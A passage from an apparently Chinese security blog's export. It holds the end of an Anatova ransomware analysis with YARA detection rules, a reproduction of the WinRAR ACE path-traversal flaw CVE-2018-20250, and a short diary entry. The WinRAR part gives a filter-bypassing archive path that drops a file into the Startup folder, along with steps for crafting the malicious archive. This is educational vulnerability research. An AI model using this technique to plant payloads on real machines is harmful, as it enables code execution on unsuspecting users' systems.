<p>同理加密Salsa20算法IV<br><img src="/Anatova_Ransomware_analysis/44.png" title="This is an example image"></p>
<p>将三个加密完后的buffer拷贝到一起<br><img src="/Anatova_Ransomware_analysis/45.png" title="This is an example image"></p>
<p>之后使用CryptBinaryToStringA函数对buffer进行Base64编码<br><img src="/Anatova_Ransomware_analysis/46.png" title="This is an example image"></p>
<p>接下来分析主要的EncryptionFilesFun函数，此函数主要判断可用的磁盘并对可用磁盘进行全盘加密，对网络磁盘也会进行加密<br><img src="/Anatova_Ransomware_analysis/47.png" title="This is an example image"></p>
<p>EnumAllFiles函数内部主要就是遍历全盘并加密<br><img src="/Anatova_Ransomware_analysis/48.png" title="This is an example image"></p>
<p>此为ExcludeSysPath函数内部主要排除对列表中的9个文件夹的加密<br><img src="/Anatova_Ransomware_analysis/49.png" title="This is an example image"></p>
<p>此函数为CryptEncryptFileDate函数内部主要逻辑，我们可以查看函数大概逻辑<br><img src="/Anatova_Ransomware_analysis/50.png" title="This is an example image"></p>
<p>ExcludeFilePath函数检查并排除列表中16个文件的加密<br><img src="/Anatova_Ransomware_analysis/51.png" title="This is an example image"></p>
<p>FileExtensionCheck函数对要加密文件的扩展名做检查排除对列表中的37个类别文件扩展名进行加密<br><img src="/Anatova_Ransomware_analysis/52.png" title="This is an example image"></p>
<p>后缀名检查函数逻辑<br><img src="/Anatova_Ransomware_analysis/53.png" title="This is an example image"></p>
<p>打开确认要加密的文件之后会对比文件末尾的记号防止二次加密<br><img src="/Anatova_Ransomware_analysis/54.png" title="This is an example image"></p>
<p>使用随机生成的Salsa20算法key和IV对文件内容进行加密<br><img src="/Anatova_Ransomware_analysis/55.png" title="This is an example image"></p>
<p>此Buffer为用来加密当前文件的Salsa20算法Key和IV，使用RSA加密之后<br><img src="/Anatova_Ransomware_analysis/56.png" title="This is an example image"></p>
<p>在将加密后文件内容，加密后的Salsa20算法Key和IV和文件大小，481写入文件后，将4字节加密记号写入文件末尾<br><img src="/Anatova_Ransomware_analysis/57.png" title="This is an example image"></p>
<p>接下来调用CreateBlackMailTxt函数在当前被加密文件路径下留下勒索信息，主要逻辑代码注释都在图中就不再解释了，接下来我们查看被加密后的文件<br><img src="/Anatova_Ransomware_analysis/58.png" title="This is an example image"></p>
<p>此图为加密后文件内容，和我们分析代码时写入的内容相同，至此勒索病毒的主要逻辑分析完毕接下来就是清理阶段<br><img src="/Anatova_Ransomware_analysis/59.png" title="This is an example image"></p>
<h2 id="清理阶段恶意代码分析"><a href="#清理阶段恶意代码分析" class="headerlink" title="清理阶段恶意代码分析"></a>清理阶段恶意代码分析</h2><p>此为清理阶段的主要3个函数<br><img src="/Anatova_Ransomware_analysis/60.png" title="This is an example image"></p>
<p>DelVolumeShadow函数内部<br><img src="/Anatova_Ransomware_analysis/61.png" title="This is an example image"></p>
<p>SelfDelete函数内部，延迟9秒删除自身文件为了后续清空自身内存留时间<br><img src="/Anatova_Ransomware_analysis/62.png" title="This is an example image"></p>
<p>CleanUpEnvironment函数清空了用到的各种密钥，还有将所动态获取的函数地址清空<br><img src="/Anatova_Ransomware_analysis/63.png" title="This is an example image"></p>
<p>最后一步清空程序所有函数代码的内存<br><img src="/Anatova_Ransomware_analysis/64.png" title="This is an example image"></p>
<h1 id="编写Yara规则"><a href="#编写Yara规则" class="headerlink" title="编写Yara规则"></a>编写Yara规则</h1><p>根据获取到的Anatova系列样本编写的规则1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule Anatovaone</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $Ana_Mail_string1 = &quot;anatoday@tutanota.com&quot;</span><br><span class="line">        $Ana_Mail_string2 = &quot;anatova1@tutanota.com&quot;</span><br><span class="line">        $Ana_Mail_string3 = &quot;anatova2@tutanota.com&quot;</span><br><span class="line">        $Ana_DASHA_string1 = &quot;XpRvUwSjSeHfJqLePsRfQtCKa1VMwaXh12&quot;</span><br><span class="line">        $Ana_DASHA_string2 = &quot;XktLWbv68EU9XhYBuvrAGtbZHronyJDt1L&quot;</span><br><span class="line">    condition:</span><br><span class="line">        $Ana_Mail_string1 or $Ana_Mail_string2 or $Ana_Mail_string3 or $Ana_DASHA_string1 or $Ana_DASHA_string2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据获取到的Anatova系列样本编写的规则2，这两个规则都可以对Anatova1.0系列样本进行查杀</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule Anatovatwo</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $Ana_Hex_string = &#123;28 28 28 4E 40 5C 28 28 28&#125;</span><br><span class="line">        $Ana_string2 = &quot;Ixsz~Hcdkxs^eY~xcdmK&quot;</span><br><span class="line">    condition:</span><br><span class="line">        all of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Anatova勒索病毒系列使用了游戏和软件的图标来伪装，以达到可以诱导用户下载运行的目的，此样本使用了Salsa20算法对文件进行加密并且最多就加密1M大小的文件内容实现了快速加密的目的，Anatova勒索病毒作者对内存的比较深入加大了分析人员进行分析的难度，我认为除非通过某些手段获取作者手上的RSA私钥否则其他方式进行解密的可能性不大，此1.0版本代码做了模块化为后面版本进行扩展功能，所以后续版本的更新威胁会比1.0版本大得多，对于应对此类勒索病毒唯一的解决方案只有预防了，备份备份再备份，安装杀毒软件并且升级最新的病毒库可以进行预防，不要打开不明来历的程序一定要用的话最好先放在虚拟机或者上传在线沙箱查看程序行为。</p>
<hr>]]></content>
      <categories>
        <category>病毒分析</category>
      </categories>
      <tags>
        <tag>Anatova</tag>
        <tag>勒索病毒</tag>
        <tag>样本分析</tag>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-2025[0-3] WinRAR代码执行漏洞复现</title>
    <url>/WinRAR_CVE_2018_2025%5B0_3%5D.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在2019-2-20日安全研究员<a href="https://twitter.com/NadavGrossman" target="_blank" rel="noopener">Nadav Grossman</a>公开披露了他在WinRAR中的一系列漏洞CVE-2018-2025[0-3]，并分享了他是如何漏洞并实现利用漏洞过程的<a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">文章</a>。</p>
<h2 id="0x01-漏洞成因"><a href="#0x01-漏洞成因" class="headerlink" title="0x01 漏洞成因"></a>0x01 漏洞成因</h2><img src="/WinRAR_CVE_2018_2025[0_3]/1.jpg" title="This is an example image">
<p>漏洞成因在于WinRAR等系列软件使用了一个ACE文件的解压模块UNACEV2.DLL造成，该DLL没有任何的漏洞缓解机制保护，该DLL在解压过程中对文件相对路径的过滤未能正确处理，导致可以将恶意软件解压到关键目录实现开机自启，实现远程代码执行或者NTLM hash泄露。</p>
<a id="more"></a>
<h2 id="0x02-构造Poc"><a href="#0x02-构造Poc" class="headerlink" title="0x02 构造Poc"></a>0x02 构造Poc</h2><p>漏洞环境配置</p>
<p>WinRAR32位：<a href="https://www.rarlab.com/rar/wrar570b2sc.exe" target="_blank" rel="noopener">https://www.rarlab.com/rar/wrar570b2sc.exe</a></p>
<p>WinAce用于创建ace文件</p>
<p>acefile.py用于解析ace文件需要pyhton3环境</p>
<p>ace.bt 010 Editor7.0模板用于解析和修改ace文件</p>
<p>以上三个工具均在此github：<a href="https://github.com/360-A-Team/CVE-2018-20250" target="_blank" rel="noopener">https://github.com/360-A-Team/CVE-2018-20250</a></p>
<p>选中要压缩的文件右键使用WinACE进行压缩</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/2.jpg" title="This is an example image">
<p>选择第三项store full path</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/3.jpg" title="This is an example image">
<p>我们使用acefile.py对我们创建的ace文件进行解析，接下来我们要开始构造poc</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/4.jpg" title="This is an example image">
<p>那我们需要对filename进行怎样的构造呢？首先我们看看触发漏洞的函数</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/5.jpg" title="This is an example image">
<p>如果GetDevicePathLen函数返回0，会将WinRAR提供的路径和ace文件中的相对路径拼接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sprintf(final_file_path, &quot;%s%s&quot;, destination_folder, file_relative_path);</span><br></pre></td></tr></table></figure>
<p>返回非0值时，会直接使用ace文件中的相对路径作为最终解压路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sprintf(final_file_path, &quot;%s%s&quot;, &quot;&quot;, file_relative_path);</span><br></pre></td></tr></table></figure>
<p>那GetDevicePathLen函数到底是干什么用的呢？GetDevicePathLen会返回解压文件的相对路径的前缀，</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/6.jpg" title="This is an example image">
<p>此时我们并没有对ace文件进行修改该函数返回0</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/7.jpg" title="This is an example image">
<p>此时的filename</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/8.jpg" title="This is an example image">
<p>我们要让GetDevicePathLen返回非0值，让WinRAR直接使用ace文件中的相对路径进行解压，还要绕过过滤和回调函数，此图引用自<a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">CheckPoint博客文章</a>，这个函数会清除提取文件的相对路径，他会过滤如下路径：*代表任何磁盘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*:\</span><br><span class="line">*:</span><br><span class="line">*:\*:</span><br></pre></td></tr></table></figure>
<img src="/WinRAR_CVE_2018_2025[0_3]/9.jpg" title="This is an example image">
<p>假如我们构造一个filename为：<code>c:\test_path\testfile.txt</code>，CleanPath函数会将此路径过滤为<code>test_path\testfile.txt</code></p>
<p>如果是<code>\test_path\testfile.txt</code>这种路径CleanPath函数不会进行任何过滤</p>
<p>所以我们要绕过CleanPath函数的过滤可以进行这样构造<code>c:\c:\test_path\testfile.txt</code>，这样的话CleanPath函数过滤的结果为<code>c:\test_path\testfile.txt</code>，除了CleanPath函数过滤WinRAR中还有一个回调函数会对黑名单中的路径进行过滤，这个回调函数检查之一就是路径以<code>\</code>开头的相对路径，当时此回调函数并不会检查如<code>c:\test_path\testfile.txt</code>路径中的<code>c:\</code>所以我们构造的filename就可以绕过所有的过滤和回调函数了，此图引用自<a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">CheckPoint博客文章</a></p>
<img src="/WinRAR_CVE_2018_2025[0_3]/10.jpg" title="This is an example image">
<p>但是我们之前构造的filename过滤后的相对路径为<code>c:\test_path\testfile.txt</code>这样的路径并不会造成任何的危害，一般要将压缩文件释放到自启目录中</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/11.jpg" title="This is an example image">
<img src="/WinRAR_CVE_2018_2025[0_3]/12.jpg" title="This is an example image">
<p>但是我们如果要知道用户名只能通过爆破，但是Nadav Grossman精心构造了如下相对路径可以完美绕过过滤和回调函数并且无需对用户名进行爆破：<code>C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\poc.exe</code>，此相对路径经过了CleanPath过滤函数和WinRAR回调函数的过滤检查之后的最终路径结果为 <code>C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\poc.exe</code></p>
<p>接下来我们动手进行构造ace文件，首先我们用010 Editor7.0打开ace并安装ace模板文件</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/13.jpg" title="This is an example image">
<p>我们将filename修改为如下</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/14.jpg" title="This is an example image">
<p>修改hdr_crc和hdr_size，在我们修改完filename之后在点击ace模板重新解析此模板会重新计算hdr_crc和hdr_size我们将head中修改为output窗口中的值即可</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/15.jpg" title="This is an example image">
<p>使用acefile.py进行解析成功，到此我们的POC就构造完毕</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/16.jpg" title="This is an example image">
<p>我们还需将ace后缀名修改为rar</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/17.jpg" title="This is an example image">
<p>解压路径</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/18.jpg" title="This is an example image">
<p>使用WinRAR进行解压POC</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/19.jpg" title="This is an example image">
<p>POC解压之后的文件夹</p>
<img src="/WinRAR_CVE_2018_2025[0_3]/20.jpg" title="This is an example image">
<p>目前WinRAR官方的修复方案就是移除UNACEV2.DLL放弃对ace文件的支持，大部分存在该问题的解压软件也是如此修复，如果需要保修ace文件解压的功能可以按照<a href>0path</a>的方案修复</p>
<h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>
<p><a href="https://xlab.tencent.com/cn/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/</a></p>
<hr>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>WinRAR</tag>
        <tag>代码执行</tag>
        <tag>CVE-2018-20250</tag>
        <tag>CVE-2018-20251</tag>
        <tag>CVE-2018-20252</tag>
        <tag>CVE-2018-20253</tag>
        <tag>UNACEV2.DLL</tag>
        <tag>ACE</tag>
      </tags>
  </entry>
  <entry>
    <title>Diary</title>
    <url>/diary.html</url>
    <content><![CDATA[<h2 id="2019-2-12"><a href="#2019-2-12" class="headerlink" title="2019-2-12"></a>2019-2-12</h2><p>今天主要将博客给配置好了，以后要多写博客.</p>
<p>最近看到了一个”tittytainment”理论，不管这个理论是否是阴谋论我认为我们都应该从现在开始努力扔掉嘴中的奶嘴.</p>
<p>下方图片为”tittytainment”理论</p>
<a id="more"></a>
<img src="/diary/1.jpg" title="This is an example image">
<img src="/diary/2.jpg" title="This is an example image">
<img src="/diary/3.jpg" title="This is an example image">
<hr>]]></content>
      <categories>
        <category>日记</category>
      </categories>
      <tags>
        <tag>随心日记</tag>
      </tags>
  </entry>
</search>
